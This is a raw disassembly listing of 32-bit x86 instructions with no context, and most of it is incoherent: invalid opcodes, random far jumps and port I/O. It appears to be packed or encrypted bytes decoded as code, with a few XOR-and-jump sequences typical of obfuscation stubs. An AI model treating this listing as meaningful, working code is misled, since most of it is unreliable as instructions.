  406949:	imul   edi,DWORD PTR [ebp+0x15],0x642b4902
  406950:	and    ebp,DWORD PTR [edx-0x1592a07c]
  406956:	stc    
  406957:	rcr    DWORD PTR [edi],1
  406959:	or     DWORD PTR [eax-0x3971f4a6],ebx
  40695f:	shl    dh,cl
  406961:	popf   
  406962:	dec    ecx
  406963:	cli    
  406964:	cmc    
  406965:	and    al,0x35
  406967:	add    al,0xb4
  406969:	popa   
  40696a:	sar    esp,0x6f
  40696d:	mov    ah,0xd2
  40696f:	int    0x7f
  406971:	pop    ds
  406972:	sbb    bl,al
  406974:	jl     0x406921
  406976:	pop    ebp
  406977:	clc    
  406978:	repnz dec esp
  40697a:	daa    
  40697b:	jnp    0x4069ad
  40697d:	fwait
  40697e:	xchg   esp,eax
  40697f:	je     0x4069af
  406981:	das    
  406982:	jp     0x40691d
  406984:	dec    ebp
  406985:	xchg   edi,eax
  406986:	sub    eax,0xdd3b374f
  40698b:	pop    eax
  40698c:	and    eax,0x4ea99f6
  406991:	scas   eax,DWORD PTR es:[edi]
  406992:	rcl    DWORD PTR [edx+0x969a3e3],1
  406998:	das    
  406999:	and    al,BYTE PTR [esi-0xa41a247]
  40699f:	mov    eax,ds:0xf4051c27
  4069a4:	xchg   ebx,eax
  4069a5:	ret    
  4069a6:	jl     0x4069e9
  4069a8:	xlat   BYTE PTR ds:[ebx]
  4069a9:	mov    bl,0xea
  4069ab:	aam    0xba
  4069ad:	sar    BYTE PTR [esi],0xd0
  4069b0:	add    eax,0x76736042
  4069b5:	mov    bl,0x9a
  4069b7:	push   ebx
  4069b8:	pop    edi
  4069b9:	adc    DWORD PTR [ebx+0x709b4d05],eax
  4069bf:	cwde   
  4069c0:	lahf   
  4069c1:	lahf   
  4069c2:	add    al,0xd7
  4069c4:	gs leave 
  4069c6:	pusha  
  4069c7:	iret   
  4069c8:	inc    esp
  4069c9:	mov    bl,0x11
  4069cb:	mov    esp,0x67aacf3a
  4069d0:	sbb    ah,BYTE PTR fs:[esi]
  4069d3:	xor    DWORD PTR [ecx],ebp
  4069d5:	inc    esp
  4069d6:	mov    ax,WORD PTR [ebx-0x4d]
  4069da:	(bad)
  4069df:	das    
  4069e0:	rcr    BYTE PTR [edx+0x55],cl
  4069e3:	std    
  4069e4:	ins    BYTE PTR es:[edi],dx
  4069e5:	sbb    eax,0x60c01a4e
  4069ea:	mov    al,0xd3
  4069ec:	pop    ss
  4069ed:	mul    esp
  4069ef:	cmp    DWORD PTR ds:0xff7a0143,eax
  4069f5:	test   eax,0x2f5b900f
  4069fa:	inc    edx
  4069fb:	pop    ebp
  4069fc:	test   al,0xe2
  4069fe:	out    dx,eax
  4069ff:	jo     0x406a1f
  406a01:	push   edi
  406a02:	mov    dl,0x20
  406a04:	mov    cl,0x9d
  406a06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a07:	push   ebp
  406a08:	cmp    eax,0x76473fc8
  406a0d:	sbb    BYTE PTR ds:0x6ee557b6,ah
  406a13:	or     BYTE PTR [ebp+0x56],bl
  406a16:	push   edi
  406a17:	xor    edi,ecx
  406a19:	mov    edi,0xf89f2dae
  406a1e:	mov    DWORD PTR [eax],edi
  406a20:	mov    eax,DWORD PTR [ebp-0x14]
  406a23:	mov    ebx,DWORD PTR [ebp-0x8]
  406a26:	xor    DWORD PTR ds:0x434703,ebx
  406a2c:	mov    ecx,0x7510851
  406a31:	xor    eax,ecx
  406a33:	sbb    esi,DWORD PTR ds:0x43467b
  406a39:	mov    esi,0x327299
  406a3e:	xor    ebx,ecx
  406a40:	add    DWORD PTR ds:0x4346bb,0x434777
  406a4a:	xor    edx,edx
  406a4c:	add    eax,esi
  406a4e:	sbb    DWORD PTR ds:0x43465f,0x1c54
  406a58:	add    ebx,esi
  406a5a:	div    ebx
  406a5c:	mov    DWORD PTR ds:0x4346b7,edi
  406a62:	jmp    0x406e50
  406a67:	inc    ebx
  406a68:	push   ebp
  406a69:	sti    
  406a6a:	sbb    DWORD PTR [ebp-0x49aabca3],0xffffff8a
  406a71:	mov    ds:0x7441cdeb,eax
  406a76:	xor    eax,0x7e7ec79d
  406a7b:	dec    edi
  406a7c:	jns    0x406afc
  406a7e:	jle    0x406a7f
  406a80:	std    
  406a81:	xchg   BYTE PTR [ecx-0x31],ah
  406a84:	retf   0x7e
  406a87:	jmp    0x34fbc546
  406a8c:	push   edi
  406a8d:	(bad)  
  406a8e:	jp     0x406b01
  406a90:	repnz test DWORD PTR [ecx-0xd],0xbf05fabf
  406a98:	mov    BYTE PTR [edi],0x48
  406a9b:	stc    
  406a9c:	je     0x406ae2
  406a9e:	repz daa 
  406aa0:	mov    esi,0xce1dd1c8
  406aa5:	push   ds
  406aa6:	test   eax,0x3d8aeaad
  406aab:	and    al,0xc9
  406aad:	mov    ebx,0xced2c25d
  406ab2:	pop    esp
  406ab3:	outs   dx,BYTE PTR ds:[esi]
  406ab4:	xor    ah,BYTE PTR [ecx+0x6b16728f]
  406aba:	mov    dl,0x90
  406abc:	inc    ecx
  406abd:	jmp    0xbf0:0x8a449f39
  406ac4:	aas    
  406ac5:	fcmovne st,st(5)
  406ac7:	add    DWORD PTR [ebp+0x65984316],ecx
  406acd:	mov    ecx,edx
  406acf:	stc    
  406ad0:	ret    
  406ad1:	xor    dh,BYTE PTR [ebx+0x47]
  406ad4:	pop    esi
  406ad5:	dec    edi
  406ad6:	test   BYTE PTR [ecx-0x2d92c35e],bl
  406adc:	pop    ebp
  406add:	dec    ebp
  406ade:	dec    eax
  406adf:	cwde   
  406ae0:	xor    cl,dl
  406ae2:	fisttp WORD PTR [edi+0xd1de4f5]
  406ae8:	scas   eax,DWORD PTR es:[edi]
  406ae9:	shl    ah,0xdb
  406aec:	jnp    0x406b66
  406aee:	or     ebp,DWORD PTR ds:[ecx-0x7f]
  406af2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406af3:	jge    0x406a94
  406af5:	fnstsw WORD PTR [ebp+0x5d924361]
  406afb:	mov    esp,0xe1d4a5d6
  406b00:	ficomp WORD PTR [ecx]
  406b02:	lods   eax,DWORD PTR ds:[esi]
  406b03:	sub    esp,edi
  406b05:	ret    0x9b6e
  406b08:	pop    ebx
  406b09:	outs   dx,BYTE PTR ds:[esi]
  406b0a:	ret    
  406b0b:	inc    edi
  406b0c:	jge    0x406b89
  406b0e:	add    bl,ch
  406b10:	retf   0xc2a
  406b13:	pop    ebp
  406b14:	adc    DWORD PTR [edx],ecx
  406b16:	push   edi
  406b17:	(bad)  
  406b18:	(bad)  
  406b19:	loope  0x406ac7
  406b1b:	shl    BYTE PTR [edi],cl
  406b1d:	pop    esp
  406b1e:	ror    BYTE PTR [eax-0xc],cl
  406b21:	rcl    DWORD PTR [ebp+0xd],cl
  406b24:	or     cl,BYTE PTR [edx]
  406b26:	xchg   BYTE PTR [edx-0x5f],bl
  406b29:	adc    BYTE PTR [ebx],ah
  406b2b:	js     0x406aec
  406b2d:	jb     0x406b21
  406b2f:	fstp   DWORD PTR [ecx-0x25715027]
  406b35:	dec    ecx
  406b36:	dec    edx
  406b37:	and    DWORD PTR [ebx+0x13],ecx
  406b3a:	rcl    DWORD PTR [ebx+eax*4-0x465ebd8a],cl
  406b41:	pusha  
  406b42:	ss and ebp,ebp
  406b45:	fwait
  406b46:	test   DWORD PTR ds:0x9929e3ee,0xad7abe1b
  406b50:	xchg   esp,eax
  406b51:	fs pop ds
  406b53:	(bad)
  406b56:	jecxz  0x406bc3
  406b58:	test   edx,ebx
  406b5a:	sahf   
  406b5b:	pop    eax
  406b5c:	push   es
  406b5d:	adc    al,0xf2
  406b5f:	add    BYTE PTR ds:0xf81d2ee8,ah
  406b65:	stc    
  406b66:	pop    eax
  406b67:	and    ebx,edx
  406b69:	jbe    0x406b92
  406b6b:	xlat   BYTE PTR ds:[ebx]
  406b6c:	repnz lods eax,DWORD PTR cs:[esi]
  406b6f:	mov    ebp,0x6c44f6a3
  406b74:	cmp    ecx,ebx
  406b76:	or     bl,al
  406b78:	mov    edi,0xf2d2f727
  406b7d:	mov    ds:0xb6506bf8,al
  406b82:	nop
  406b83:	jp     0x406b9a
  406b85:	inc    edx
  406b86:	cmp    bl,BYTE PTR [edi+0x55029c9b]
  406b8c:	les    ebp,FWORD PTR [esi+0x3693cd]
  406b92:	sbb    al,0xda
  406b95:	jp     0x406b7b
  406b97:	dec    esi
  406b98:	jp     0x406b6d
  406b9a:	out    0xff,eax
  406b9c:	sub    al,0xbe
  406b9e:	push   ss
  406b9f:	int3   
  406ba0:	jo     0x406bc3
  406ba2:	(bad)  
  406ba3:	push   edi
  406ba4:	pop    es
  406ba5:	int3   
  406ba6:	mov    eax,ebx
  406ba8:	push   0xadfbeacb
  406bad:	jnp    0x406c17
  406baf:	cmp    al,0x6f
  406bb1:	jb     0x406b71
  406bb3:	jmp    0x406b6a
  406bb5:	das    
  406bb6:	(bad)  
  406bb7:	fs out dx,eax
  406bb9:	fsub   DWORD PTR [esi+0x18424abd]
  406bbf:	mov    ah,0xf2
  406bc1:	jae    0x406b70
  406bc3:	popa   
  406bc4:	shr    al,0xbb
  406bc7:	sti    
  406bc8:	sti    
  406bc9:	sub    BYTE PTR [edi+0x6a],bh
  406bcc:	hlt    
  406bcd:	mul    esi
  406bcf:	jge    0x406bef
  406bd1:	or     eax,0x3feb574c
  406bd6:	xchg   BYTE PTR [ecx-0x279eb00b],bl
  406bdc:	(bad)  [edi-0x41184cd7]
  406be3:	dec    esi
  406be4:	mov    ecx,0xa67ae9ea
  406be9:	sub    dl,ch
  406beb:	popa   
  406bec:	pop    edi
  406bed:	(bad)  
  406bee:	sar    ebp,cl
  406bf0:	jl     0x406b9f
  406bf2:	fcom   st(1)
  406bf4:	pop    ecx
  406bf5:	xor    eax,DWORD PTR [edi+0x7e066964]
  406bfb:	stos   BYTE PTR es:[edi],al
  406bfc:	ficomp DWORD PTR [esi]
  406bfe:	(bad)  
  406bff:	dec    esp
  406c00:	dec    edi
  406c01:	mov    esp,DWORD PTR [ecx+ebp*2-0x4f3092b4]
  406c08:	in     eax,0x22
  406c0a:	push   cs
  406c0b:	outs   dx,BYTE PTR ds:[esi]
  406c0c:	inc    ecx
  406c0d:	in     eax,0xeb
  406c0f:	adc    eax,0x59a5d3b7
  406c14:	dec    BYTE PTR [ebx]
  406c16:	bound  esp,QWORD PTR [edx]
  406c18:	retf   
  406c19:	inc    ebp
  406c1a:	xchg   edx,eax
  406c1b:	push   esi
  406c1c:	dec    ebx
  406c1d:	and    al,0x2a
  406c1f:	add    al,0xb
  406c21:	and    ch,BYTE PTR [edi+eiz*1]
  406c24:	fistp  WORD PTR [ebx-0x3a]
  406c27:	shr    bh,cl
  406c29:	jecxz  0x406c91
  406c2b:	es add edx,edx
  406c2e:	push   cs
  406c2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c30:	jnp    0x406bb7
  406c32:	pop    ebp
  406c33:	add    edi,DWORD PTR [eax+0x1adb6b96]
  406c39:	push   ss
  406c3a:	repz jno 0x406c17
  406c3d:	adc    cl,cl
  406c3f:	ja     0x406be5
  406c41:	lahf   
  406c42:	sbb    al,0x8b
  406c44:	call   0xa144:0x40a54f77
  406c4b:	call   0x8b2e:0x1db42295
  406c52:	jle    0x406c73
  406c54:	test   eax,0x702b3c04
  406c59:	push   ebp
  406c5a:	leave  
  406c5b:	test   BYTE PTR [esi+0x7eaef238],ah
  406c61:	ds push eax
  406c63:	in     al,dx
  406c64:	cmp    DWORD PTR [eax+0x7cd2a16f],edi
  406c6a:	jmp    0xe44b:0x83721d6a
  406c71:	push   0x8a03c063
  406c76:	jle    0x406ce4
  406c78:	dec    esp
  406c79:	jbe    0x406c60
  406c7b:	fcmove st,st(7)
  406c7d:	mov    eax,0xc08959e6
  406c82:	pop    ds
  406c83:	xchg   al,bl
  406c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c86:	and    al,0x5f
  406c88:	dec    esp
  406c89:	mov    bh,0x17
  406c8b:	loop   0x406c85
  406c8d:	stos   BYTE PTR es:[edi],al
  406c8e:	repnz mov ebx,0xd8a6e3a5
  406c94:	adc    eax,0x8bb45d9e
  406c99:	mov    edx,0x7b8c2a16
  406c9e:	and    ecx,eax
  406ca0:	sbb    edx,0xa4edf390
  406ca6:	test   DWORD PTR [esi-0x4eaae441],ebx
  406cac:	push   ecx
  406cad:	daa    
  406cae:	fild   WORD PTR [ebx+0x51]
  406cb1:	xchg   ebx,eax
  406cb2:	jl     0x406c42
  406cb4:	loopne 0x406c44
  406cb6:	gs daa 
  406cb8:	dec    ecx
  406cb9:	xchg   edi,eax
  406cba:	ror    BYTE PTR [edi-0x647af1bb],0x4d
  406cc1:	inc    esi
  406cc2:	mov    dl,0x79
  406cc4:	cmc    
  406cc5:	jmp    0x1953:0x27cf02c4
  406ccc:	ret    
  406ccd:	push   eax
  406cce:	cmp    eax,0xa9a5413
  406cd3:	jg     0x406cec
  406cd5:	ins    BYTE PTR es:[edi],dx
  406cd6:	fistp  DWORD PTR [esi]
  406cd8:	add    dl,cl
  406cda:	out    0x85,al
  406cdc:	sub    al,0xc0
  406cde:	(bad)  
  406cdf:	jno    0x406d32
  406ce1:	popa   
  406ce2:	cmp    esp,DWORD PTR [ecx-0x37]
  406ce5:	fdiv   st,st(0)
  406ce7:	outs   dx,DWORD PTR ds:[esi]
  406ce8:	xor    dl,BYTE PTR [esi]
  406cea:	les    esp,FWORD PTR [edx-0x5d]
  406ced:	jmp    0x406c91
  406cef:	adc    cl,dh
  406cf1:	mov    al,ds:0x2c1dbbb2
  406cf6:	test   al,0x9
  406cf8:	rol    BYTE PTR [ebx+esi*1],1
  406cfb:	cld    
  406cfc:	sbb    ebp,esi
  406cfe:	cmc    
  406cff:	or     eax,0x2b8cbd3c
  406d04:	rcl    BYTE PTR [ecx-0x48],cl
  406d07:	mov    ds:0xeef8c102,eax
  406d0c:	dec    eax
  406d0d:	and    BYTE PTR [ebx+0x341f8161],dh
  406d13:	and    al,0x39
  406d15:	sbb    BYTE PTR [eax+0x6547751],bh
  406d1b:	xchg   edi,eax
  406d1c:	sbb    edx,esi
  406d1e:	cs pop esi
  406d20:	inc    esp
  406d21:	add    DWORD PTR [ebp+0x22],ecx
  406d24:	aas    
  406d25:	in     eax,0x31
  406d27:	add    BYTE PTR [edx-0x58],cl
  406d2a:	outs   dx,BYTE PTR ds:[esi]
  406d2b:	sub    eax,0xd0e0c75f
  406d30:	pushf  
  406d31:	inc    esp
  406d32:	and    eax,0xa153f8ba
  406d37:	push   esp
  406d38:	mov    ecx,0x6ec57b0a
  406d3d:	jbe    0x406d7e
  406d3f:	inc    eax
  406d40:	sbb    esi,DWORD PTR [eax+eax*2]
  406d43:	inc    ebx
  406d44:	dec    ebp
  406d45:	mov    ebx,0xa9f5d19a
  406d4a:	xlat   BYTE PTR ds:[ebx]
  406d4b:	pop    ecx
  406d4c:	mov    al,ds:0x90b0decc
  406d51:	int    0xf1
  406d53:	out    dx,al
  406d54:	push   ds
  406d55:	sbb    eax,0xb0513f74
  406d5a:	sbb    DWORD PTR [esp+ebx*4+0x4b],edi
  406d5e:	inc    edi
  406d5f:	in     eax,dx
  406d60:	sti    
  406d61:	jbe    0x406da8
  406d63:	jg     0x406d9d
  406d65:	xor    eax,0x6f7ca624
  406d6a:	and    edx,DWORD PTR [ebp+ebx*1+0x615110cc]
  406d71:	xlat   BYTE PTR ds:[ebx]
  406d72:	pusha  
  406d73:	mov    ch,0x4e
  406d75:	adc    dh,BYTE PTR [ecx]
  406d77:	pushf  
  406d78:	or     BYTE PTR [edx+0x7be42ff2],dh
  406d7e:	mov    ecx,0xd18a538d
  406d83:	inc    edi
  406d84:	dec    ebx
  406d85:	xchg   ebp,eax
  406d86:	outs   dx,DWORD PTR ds:[esi]
  406d87:	xor    eax,0x42a24372
  406d8c:	push   esp
  406d8d:	cld    
  406d8e:	jae    0x406d36
  406d90:	sub    DWORD PTR [edx],ecx
  406d92:	arpl   WORD PTR [ebx],ax
  406d94:	sbb    BYTE PTR [si+0xd34],ch
  406d99:	les    esp,FWORD PTR [ebx]
  406d9b:	cmp    DWORD PTR [ecx],edi
  406d9d:	cmp    al,0x22
  406d9f:	xor    DWORD PTR [ebp+eax*8+0x1b],ebx
  406da3:	jbe    0x406dda
  406da5:	data16 adc al,0xfc
  406da8:	mov    ah,0x4e
  406daa:	jne    0x406dd5
  406dac:	repz and ecx,DWORD PTR [eax]
  406daf:	push   0xffffff96
  406db1:	das    
  406db2:	scas   eax,DWORD PTR es:[edi]
  406db3:	aam    0x19
  406db5:	mov    ecx,0xc0dce147
  406dba:	or     ebp,esi
  406dbc:	pop    edx
  406dbd:	je     0x406de6
  406dbf:	dec    esi
  406dc0:	ja     0x406d70
  406dc2:	inc    ebp
  406dc3:	je     0x406dc3
  406dc5:	and    esp,DWORD PTR [edi]
  406dc7:	mov    eax,ds:0x9f231d80
  406dcc:	inc    BYTE PTR [eax+eiz*4]
  406dcf:	mov    WORD PTR [ecx],cs
  406dd1:	sbb    eax,0xfb31825c
  406dd6:	fild   WORD PTR [edi-0x44b1665b]
  406ddc:	cwde   
  406ddd:	inc    esi
  406dde:	push   ebp
  406ddf:	cmp    DWORD PTR [edx],0xffffffff
  406de2:	fcom   DWORD PTR [edi]
  406de4:	aas    
  406de5:	stos   BYTE PTR es:[edi],al
  406de6:	bound  esp,QWORD PTR [ebp+0x76]
  406de9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406dea:	and    DWORD PTR [ecx+esi*8+0x2d],ebp
  406dee:	xchg   ebx,eax
  406def:	pop    esp
  406df0:	pop    edi
  406df1:	adc    eax,0x63131b5b
  406df6:	xchg   DWORD PTR [ecx+ebx*2-0x23],esi
  406dfa:	popf   
  406dfb:	ss (bad) 
  406dfd:	lahf   
  406dfe:	cmp    dh,BYTE PTR [edx+0x7207aba]
  406e04:	aad    0x1c
  406e06:	adc    eax,0x1b5c2bc2
  406e0b:	dec    ebp
  406e0c:	(bad)  
  406e0d:	loopne 0x406db5
  406e0f:	(bad)  
  406e10:	mov    DWORD PTR [edx],edi
  406e12:	(bad)  [ecx]
  406e14:	inc    di
  406e16:	inc    ebx
  406e17:	lahf   
  406e18:	cmp    al,0xa8
  406e1a:	ficom  WORD PTR [edi-0x2b04b35e]
  406e20:	add    DWORD PTR [ecx-0x63],esi
  406e23:	or     dh,BYTE PTR [edi+ebp*1]
  406e26:	dec    eax
  406e27:	test   edx,ebp
  406e29:	pop    edx
  406e2a:	inc    edx
  406e2b:	xchg   ebp,eax
  406e2c:	mov    dh,0x5e
  406e2e:	mov    eax,ds:0x9cd1b7b0
  406e33:	pop    ebp
  406e34:	in     al,dx
  406e35:	pop    ss
  406e36:	sub    BYTE PTR [edx+0x71fa629a],dl
  406e3c:	jns    0x406e89
  406e3e:	inc    ebx
  406e3f:	(bad)  
  406e40:	inc    ebp
  406e41:	sub    eax,0xe50bfc6d
  406e46:	push   0x24
  406e48:	jo     0x406deb
  406e4a:	add    dl,BYTE PTR [edx+0x82b0068]
  406e50:	mov    edx,DWORD PTR [ebp-0x20]
  406e53:	mov    DWORD PTR ds:0x4346c7,0x7e00
  406e5d:	jmp    0x40724b
  406e62:	xchg   dl,dl
  406e64:	mov    bl,0x98
  406e66:	jae    0x406ec1
  406e68:	popf   
  406e69:	cld    
  406e6a:	ja     0x406e58
  406e6c:	or     dh,BYTE PTR [eax+0x33419b89]
  406e72:	out    dx,al
  406e73:	ret    
  406e74:	jle    0x406ef4
  406e76:	dec    edi
  406e77:	jns    0x406ef7
  406e79:	jle    0x406e44
  406e7b:	out    0x80,al
  406e7d:	xchg   edx,eax
  406e7e:	jnp    0x406eae
  406e80:	adc    bl,BYTE PTR [ebx]
  406e82:	mov    al,ds:0xf1f6364a
  406e87:	dec    eax
  406e88:	out    dx,al
  406e89:	pop    eax
  406e8a:	retf   
  406e8b:	and    eax,0x5c9a3fa0
  406e90:	and    eax,0xc842eeb6
  406e95:	dec    BYTE PTR [edx+ecx*4-0x1b]
  406e99:	mov    eax,ds:0xf6a205e4
  406e9e:	scas   eax,DWORD PTR es:[edi]
  406e9f:	xchg   ecx,eax
  406ea0:	jb     0x406eea
  406ea2:	loope  0x406ebb
  406ea4:	push   ds
  406ea5:	adc    bh,BYTE PTR [ebx+0x382c66d7]
  406eab:	jmp    0x406e4b
  406ead:	call   0x1604:0xd2616bbd
  406eb4:	call   0x1462:0x272d8c37
  406ebb:	pop    ss
  406ebc:	sbb    eax,0x8fe2f730
  406ec1:	adc    DWORD PTR [edi],ebx
  406ec3:	push   edx
  406ec4:	dec    ebx
  406ec5:	rol    BYTE PTR [ecx+0x166cadf9],cl
  406ecb:	mov    es:0x993e20a,eax
  406ed1:	jecxz  0x406e89
  406ed3:	out    dx,al
  406ed4:	mov    dh,0x84
  406ed6:	gs test edi,edx
  406ed9:	rcr    DWORD PTR [ecx-0x10],1
  406edc:	push   ds
  406edd:	mov    ds:0x270a1fca,eax
  406ee2:	fmul   st(3),st
  406ee4:	mov    BYTE PTR [edi-0x1626d297],ch
  406eea:	rcl    DWORD PTR [ebp-0x59],cl
  406eed:	jnp    0x406edf
  406eef:	push   eax
  406ef0:	mov    esp,0xce01138f
  406ef5:	fnsave [edx+0x35443f19]
  406efb:	in     al,dx
  406efc:	in     al,0xa9
  406efe:	repnz mov edx,0xbb6b3e0e
  406f04:	jo     0x406f68
  406f06:	fdivr  QWORD PTR [ebx-0xe]
  406f09:	dec    ecx
  406f0a:	lahf   
  406f0b:	sbb    BYTE PTR [edi-0x1a],dl
  406f0e:	aam    0x76
  406f10:	jmp    0x5a57:0x47eb314f
  406f17:	sbb    esp,DWORD PTR [ebp-0x4]
  406f1a:	mov    WORD PTR [edx+0x2f9d9c4b],gs
  406f20:	mov    eax,ds:0x6e9480e6
  406f25:	mov    DWORD PTR [ebx+ebx*2],ebp
  406f28:	sbb    al,0xa9
  406f2a:	xor    DWORD PTR [esi-0x16b2d5a7],ecx
  406f30:	push   es
  406f31:	and    al,0x7d
  406f33:	push   ebp
  406f34:	hlt    
  406f35:	hlt    
  406f36:	dec    edi
  406f37:	jl     0x406f0d
  406f39:	push   ds
  406f3a:	cmp    BYTE PTR [edi+0x1b],dl
  406f3d:	sub    eax,0xd31e8adc
  406f42:	xchg   edx,eax
  406f43:	add    eax,0x18d16795
  406f48:	pop    ebx
  406f49:	pushf  
  406f4a:	add    dl,BYTE PTR [ebx+esi*8+0x32a22aaf]
  406f51:	leave  
  406f52:	test   BYTE PTR ss:[edx+edx*2+0x3e525a0a],ah
  406f5a:	sbb    cl,BYTE PTR [ecx]
  406f5c:	push   eax
  406f5d:	pop    ss
  406f5e:	adc    DWORD PTR [esi],eax
  406f60:	pop    eax
  406f61:	add    DWORD PTR [ecx+0x13],edi
  406f64:	pop    edx
  406f65:	in     al,dx
  406f66:	cmp    BYTE PTR [edx-0x42],0x65
  406f6a:	sbb    DWORD PTR [edi],edi
  406f6c:	pop    ecx
  406f6d:	mov    bh,0x53
  406f6f:	inc    esp
  406f70:	lds    ebp,FWORD PTR [eax-0x525c0481]
  406f76:	(bad)  
  406f77:	cmp    BYTE PTR [ebx+eiz*2+0x3fcc9d2c],bh
  406f7e:	shl    DWORD PTR [ecx-0x18],cl
  406f81:	sti    
  406f82:	pushf  
  406f83:	push   eax
  406f84:	and    BYTE PTR [esi-0xb027f0f],bh
  406f8a:	inc    edi
  406f8b:	or     eax,0x7f5c6402
  406f90:	pop    es
  406f91:	add    eax,0x12bc0daa
  406f96:	cdq    
  406f97:	jecxz  0x406fcd
  406f99:	fdivr  DWORD PTR [edx+edx*2]
  406f9c:	dec    eax
  406f9d:	clc    
  406f9e:	and    al,BYTE PTR [esi-0x6d]
  406fa1:	ss out dx,al
  406fa3:	retf   0xdc
  406fa6:	and    ah,BYTE PTR [ecx-0x38]
  406fa9:	pop    edi
  406faa:	lods   eax,DWORD PTR ds:[esi]
  406fab:	sbb    eax,0x68e8e595
  406fb0:	pushf  
  406fb1:	mov    eax,ds:0x1536b9f4
  406fb6:	mul    cl
  406fb8:	lds    eax,FWORD PTR ds:0x4e918d60
  406fbe:	pop    eax
  406fbf:	push   cs
  406fc0:	hlt    
  406fc1:	retf   
  406fc2:	rcl    ebp,cl
  406fc4:	test   al,0x49
  406fc6:	fs xchg edx,eax
  406fc8:	daa    
  406fc9:	sbb    al,0xb7
  406fcb:	cmp    BYTE PTR [esi],bh
  406fcd:	int    0xee
  406fcf:	mov    edx,0x8f783308
  406fd4:	jge    0x407043
  406fd6:	jle    0x407053
  406fd8:	sub    ebx,ebp
  406fda:	into   
  406fdb:	lea    edi,[esi*1+0x1733cad6]
  406fe2:	jb     0x407022
  406fe4:	in     eax,dx
  406fe5:	mov    DWORD PTR [ebx-0x29d314be],ebx
  406feb:	bnd jb 0x407056
  406fee:	mov    bl,0xb8
  406ff0:	retf   0x1307
  406ff3:	in     eax,dx
  406ff4:	push   ebp
  406ff5:	xchg   ebx,eax
  406ff6:	jp     0x40703f
  406ff8:	retf   
  406ff9:	hlt    
  406ffa:	push   esi
  406ffb:	push   edx
  406ffc:	cs ds xor eax,0x2fa2ab17
  407003:	data16 add BYTE PTR [ecx+0x19],ah
  407007:	fild   DWORD PTR [esi+0x7e0d959e]
  40700d:	cmc    
  40700e:	push   ss
  40700f:	(bad)  
  407010:	call   0x277577a3
  407015:	rcr    bh,1
  407017:	sar    DWORD PTR [edi-0x1c],cl
  40701a:	or     al,0x5e
  40701c:	sub    al,BYTE PTR [edi+0x66c5e742]
  407022:	cmp    al,0xfd
  407024:	add    al,0x7
  407026:	and    al,0x9c
  407028:	scas   eax,DWORD PTR es:[edi]
  407029:	add    DWORD PTR [edi-0x46da1f11],ebx
  40702f:	pop    ecx
  407030:	and    DWORD PTR [eax+0x2de0665],esp
  407036:	add    ecx,ebp
  407038:	ds nop
  40703a:	call   edi
  40703c:	(bad)  
  40703d:	adc    ebp,DWORD PTR [ebx-0x18]
  407040:	add    bh,dh
  407042:	sub    eax,edx
  407044:	push   ebp
  407045:	or     BYTE PTR [esi-0x14],0xd1
  407049:	mov    edx,gs
  40704b:	imul   esp,DWORD PTR [ecx],0x17
  40704e:	push   ecx
  40704f:	call   0x1584bba3
  407054:	mov    edx,0xb9eca42b
  407059:	inc    edi
  40705a:	imul   ebx,DWORD PTR [ebx+0x50],0x8ecea583
  407061:	lahf   
  407062:	clc    
  407063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407064:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407065:	fldcw  WORD PTR [ebx-0x55]
  407068:	cdq    
  407069:	ror    DWORD PTR [eax+eax*2+0x2449a800],0xed
  407071:	fstp   DWORD PTR [ecx-0x12]
  407074:	ja     0x407008
  407076:	inc    esi
  407077:	cmp    esi,DWORD PTR [esi]
  407079:	or     al,0xfb
  40707b:	jle    0x40704c
  40707d:	ror    ah,0xcb
  407080:	ss sub cl,0x5a
  407084:	bound  edi,QWORD PTR [ecx+eiz*4]
  407087:	mov    BYTE PTR [esi+0x42],cl
  40708a:	popf   
  40708b:	stos   BYTE PTR es:[edi],al
  40708c:	or     DWORD PTR [ebp-0x75e69581],eax
  407092:	push   cs
  407093:	test   BYTE PTR [ebp+0x66],dh
  407096:	pop    edx
  407097:	retf   
  407098:	imul   esi,DWORD PTR [eax],0xffffffa3
  40709b:	push   esp
  40709c:	sar    DWORD PTR [edx-0x1206d6b7],0x91
  4070a3:	jmp    0xce4fb89a
  4070a8:	add    ebp,ecx
  4070aa:	push   esi
  4070ab:	rcr    BYTE PTR [ecx],1
  4070ad:	or     al,0x1a
  4070af:	lock (bad) 
  4070b1:	mov    eax,DWORD PTR [ebp-0x2c]
  4070b4:	aad    0x19
  4070b6:	repnz aaa 
  4070b8:	sub    eax,DWORD PTR [edi-0x59bbd7de]
  4070be:	pushf  
  4070bf:	cmp    eax,0x96a5e748
  4070c4:	sbb    eax,0xfdc3ee6e
  4070c9:	jns    0x407105
  4070cb:	int    0x9
  4070cd:	xchg   ebx,eax
  4070ce:	fimul  DWORD PTR [eax+0x29d3d714]
  4070d4:	retf   0xa3ce
  4070d7:	pop    ecx
  4070d8:	das    
  4070d9:	test   al,0xf3
  4070db:	mov    bh,0x25
  4070de:	pop    ss
  4070df:	in     al,0x49
  4070e1:	mov    ch,ah
  4070e3:	scas   eax,DWORD PTR es:[edi]
  4070e4:	push   0xfe6512e9
  4070e9:	push   edi
  4070ea:	inc    ebx
  4070eb:	pop    edi
  4070ec:	pop    ebx
  4070ed:	ds stos BYTE PTR es:[edi],al
  4070ef:	pop    eax
  4070f0:	or     eax,0xea71b2f8
  4070f5:	inc    edx
  4070f6:	xchg   esp,eax
  4070f7:	jae    0x4070e1
  4070f9:	push   ecx
  4070fa:	call   0x447c:0x2b27ff9
  407101:	mov    ebp,0x79278c7d
  407106:	aas    
  407107:	xor    eax,0x4126ce03
  40710c:	cld    
  40710d:	push   esp
  40710e:	retf   
  40710f:	shl    ah,cl
  407111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407112:	and    eax,0x5e7091d7
  407117:	mov    al,0x4a
  407119:	cs inc ebp
  40711b:	xchg   ebp,eax
  40711c:	cmp    ah,BYTE PTR [ebx-0x2df64267]
  407122:	ret    0xbfae
  407125:	imul   ebx,eax,0xffffffe3
  407128:	out    dx,eax
  407129:	mul    cl
  40712b:	fs stos DWORD PTR es:[edi],eax
  40712d:	cld    
  40712e:	pop    ebp
  40712f:	mov    eax,0x85c78a39
  407134:	push   0xeaac9e7d
  407139:	(bad)  
  40713a:	pop    esi
  40713b:	out    0xfe,al
